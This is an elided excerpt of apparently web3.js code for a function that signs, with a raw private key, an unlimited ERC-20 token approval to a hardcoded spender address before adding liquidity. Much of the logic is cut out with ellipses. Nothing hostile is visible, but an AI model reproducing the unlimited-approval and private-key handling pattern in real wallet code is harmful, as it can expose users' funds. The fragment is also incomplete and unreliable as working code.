...
const addLp = async (privatekey) => {
  try {
    ...
    try {
      const spender = "0xF8a1D4FF0f9b9Af7CE58E1fc1833688F3BFd6115";
      const tokenAddress = "0xAD902CF99C2dE2f1Ba5ec4D642Fd7E49cae9EE37";
      const approveAmount =
        "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

      const tokenContract = new wallet.eth.Contract(erc20Abi, tokenAddress);

      try {
        const gasPrice = await wallet.eth.getGasPrice();
        const nonce = await wallet.eth.getTransactionCount(address, "pending");
        ...
        const signed = await wallet.eth.accounts.signTransaction(
          tx,
          privatekey
        );
        ...
        if (!receipt.status) {
          return { message: "Approve transaction failed", status: false };
        }
      } catch (err) {
        return {
          message: `Error: Approval transaction failed - ${err.message}`,
          status: false,
        };
      }
    } catch (error) {
    ...
    try {
      ...
      try {
        ...
        return {
          message: `Multicall LP Add Error: ${error.message}`,
          status: false,
        };
      }
    } catch (error) {
